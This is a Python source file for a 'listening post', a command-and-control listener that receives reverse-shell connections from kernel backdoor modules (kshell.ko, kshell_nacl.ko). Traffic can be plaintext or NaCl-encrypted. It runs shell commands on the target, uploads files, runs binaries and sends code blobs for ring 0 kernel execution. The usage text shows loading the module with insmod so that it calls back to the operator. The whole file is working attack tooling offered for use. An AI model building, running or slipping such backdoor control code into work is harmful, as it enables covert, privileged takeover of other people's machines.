#!/usr/bin/env python3
"""
Listening Post — Operator-side tool for kshell and kshell_nacl.

Supports both plaintext (kshell.ko) and NaCl-encrypted (kshell_nacl.ko) modes.

Usage:
  # Plaintext mode (for kshell.ko)
  python3 kernel/lp/listener.py --port 4444

  # Encrypted mode (for kshell_nacl.ko — uses NaCl secretbox)
  KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
  echo "Key: $KEY"
  python3 kernel/lp/listener.py --port 4444 --key $KEY

  # Generate a key
  python3 kernel/lp/listener.py --genkey
"""

from __future__ import annotations

import argparse
import contextlib
import importlib.util
import os
import socket
import struct
import sys
import threading

# Try to import NaCl bindings (PyNaCl or libnacl)
try:
    import nacl.secret
    import nacl.utils

    HAS_NACL = True
except ImportError:
    HAS_NACL = False

# Fallback: detect the cryptography library (XSalsa20) if PyNaCl is absent
HAS_CRYPTO_FALLBACK = (
    not HAS_NACL and importlib.util.find_spec("cryptography") is not None
)


class PlaintextSession:
    """Plaintext session for kshell.ko (no encryption)."""

    def __init__(self, sock: socket.socket):
        self.sock = sock

    def recv(self) -> bytes:
        return self.sock.recv(65536)

    def send(self, data: bytes):
        self.sock.sendall(data)

    def close(self):
        self.sock.close()


class NaClSession:
    """NaCl secretbox encrypted session for kshell_nacl.ko.

    Wire format (matches the kernel module's tweetnacl_kernel.h):
      [4-byte LE total_len][24-byte nonce][16-byte authenticator][ciphertext]

    The kernel sends/receives using crypto_secretbox which uses
    XSalsa20 + Poly1305. The 32-byte zero prefix on plaintext and
    16-byte zero prefix on ciphertext are stripped on the wire.
    """

    def __init__(self, sock: socket.socket, key_hex: str):
        self.sock = sock
        self.key = bytes.fromhex(key_hex)
        assert len(self.key) == 32, "Key must be 32 bytes (64 hex chars)"

        if HAS_NACL:
            self.box = nacl.secret.SecretBox(self.key)
        else:
            self.box = None

        self.send_counter = 0

    def recv(self) -> bytes:
        """Receive and decrypt a NaCl secretbox message."""
        # Read 4-byte length prefix
        raw_len = self._recv_exact(4)
        if not raw_len:
            return b""
        frame_len = struct.unpack("<I", raw_len)[0]
        if frame_len > 65536:
            raise ValueError(f"Frame too large: {frame_len}")

        # Read payload: [24-byte nonce][authenticator + ciphertext]
        payload = self._recv_exact(frame_len)
        if not payload:
            return b""

        nonce = payload[:24]
        auth_and_ct = payload[24:]  # 16-byte Poly1305 tag + ciphertext

        if self.box:
            # PyNaCl expects nonce + ciphertext (tag is inside ciphertext)
            try:
                return self.box.decrypt(auth_and_ct, nonce)
            except Exception as e:
                print(f"\n[!] Decryption failed: {e}")
                return b""
        else:
            print("[!] No NaCl library available for decryption")
            return b""

    def send(self, data: bytes):
        """Encrypt and send a NaCl secretbox message."""
        # Build 24-byte nonce: 16 zero bytes + 8-byte counter
        nonce = b"\x00" * 16 + struct.pack("<Q", self.send_counter)
        self.send_counter += 1

        if self.box:
            # PyNaCl encrypt returns nonce + ciphertext, but we already have nonce
            encrypted = self.box.encrypt(data, nonce)
            # encrypted.ciphertext is the auth tag + ciphertext (without nonce)
            auth_and_ct = encrypted.ciphertext
        else:
            print("[!] No NaCl library available for encryption")
            return

        # Wire: [4-byte len][24-byte nonce][auth_and_ct]
        wire_payload = nonce + auth_and_ct
        frame = struct.pack("<I", len(wire_payload)) + wire_payload
        self.sock.sendall(frame)

    def close(self):
        self.sock.close()

    def _recv_exact(self, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = self.sock.recv(n - len(buf))
            if not chunk:
                return b""
            buf += chunk
        return buf


def run_listener(port: int, key: str | None):
    """Start the listening post."""
    encrypted = bool(key)

    if encrypted and not HAS_NACL:
        print("[!] PyNaCl required for encrypted mode")
        print("[*] Install: pip install pynacl")
        sys.exit(1)

    mode = "NaCl secretbox (XSalsa20 + Poly1305)" if encrypted else "plaintext"
    print(f"\n{'=' * 60}")
    print("  LISTENING POST")
    print(f"  Port: {port}")
    print(f"  Mode: {mode}")
    if encrypted:
        print(f"  Key:  {key[:16]}...{key[-8:]}")
    print(f"{'=' * 60}")
    print("\n[*] Waiting for kernel shell connection...\n")

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)

    try:
        while True:
            conn, addr = srv.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")

            if encrypted:
                session = NaClSession(conn, key)
                print("[*] NaCl encrypted session")
            else:
                session = PlaintextSession(conn)

            handle_session(session)
            print("\n[*] Session closed, waiting for next connection...\n")
    except KeyboardInterrupt:
        print("\n[*] Listener stopped")
    finally:
        srv.close()


def handle_session(session):
    """Interactive shell session."""
    running = [True]

    def recv_loop():
        while running[0]:
            try:
                data = session.recv()
                if not data:
                    print("\n[*] Connection closed by kernel")
                    running[0] = False
                    break
                sys.stdout.write(data.decode("utf-8", errors="replace"))
                sys.stdout.flush()
            except (ConnectionResetError, BrokenPipeError, OSError):
                running[0] = False
                break

    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()

    try:
        while running[0]:
            try:
                line = input()
            except EOFError:
                break
            if not running[0]:
                break

            stripped = line.strip()

            # Local commands that prepare data before sending
            if stripped.startswith("!upload "):
                # !upload <local_file> <remote_path>
                parts = stripped[8:].split(None, 1)
                if len(parts) != 2:
                    print("[lp] usage: !upload <local_file> <remote_path>")
                    continue
                local_file, remote_path = parts
                try:
                    import base64

                    data = open(local_file, "rb").read()
                    b64 = base64.b64encode(data).decode()
                    print(
                        f"[lp] uploading {local_file} ({len(data)} bytes) → {remote_path}"
                    )
                    session.send(f"!upload {remote_path} {b64}\n".encode())
                except FileNotFoundError:
                    print(f"[lp] file not found: {local_file}")
                    continue
                except Exception as e:
                    print(f"[lp] upload error: {e}")
                    continue

            elif stripped.startswith("!kload "):
                # !kload <local_file> — send PIC blob for kernel execution
                local_file = stripped[7:].strip()
                try:
                    import base64

                    data = open(local_file, "rb").read()
                    b64 = base64.b64encode(data).decode()
                    print(
                        f"[lp] sending PIC blob {local_file} ({len(data)} bytes) for ring 0 exec"
                    )
                    session.send(f"!kload {b64}\n".encode())
                except FileNotFoundError:
                    print(f"[lp] file not found: {local_file}")
                    continue
                except Exception as e:
                    print(f"[lp] kload error: {e}")
                    continue

            elif stripped == "!help":
                print("Operator commands:")
                print("  <cmd>                      — execute shell command on target")
                print("  !upload <local> <remote>   — upload file to target")
                print("  !run <path> [args]         — run uploaded binary on target")
                print("  !kload <local_blob>        — send PIC blob → ring 0 execution")
                print("  exit                       — disconnect")
                continue

            else:
                session.send((line + "\n").encode())

            if stripped == "exit":
                break
    except KeyboardInterrupt:
        pass

    running[0] = False
    with contextlib.suppress(OSError):
        session.close()


def main():
    parser = argparse.ArgumentParser(
        description="Kernel Shell Listening Post",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Plaintext (kshell.ko)
  python3 kernel/lp/listener.py --port 4444

  # Encrypted (kshell_nacl.ko)
  KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
  python3 kernel/lp/listener.py --port 4444 --key $KEY

  # Generate a key
  python3 kernel/lp/listener.py --genkey
        """,
    )

    parser.add_argument("--port", type=int, default=4444)
    parser.add_argument(
        "--key", default=None, help="256-bit hex key for NaCl encrypted mode"
    )
    parser.add_argument(
        "--genkey", action="store_true", help="Generate and print a random key"
    )
    args = parser.parse_args()

    if args.genkey:
        k = os.urandom(32).hex()
        print(f"Key: {k}")
        print("\nUsage:")
        print(f"  python3 kernel/lp/listener.py --port {args.port} --key {k}")
        print(f"  insmod kshell_nacl.ko host=<IP> port={args.port} key={k}")
        return 0

    run_listener(args.port, args.key)
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
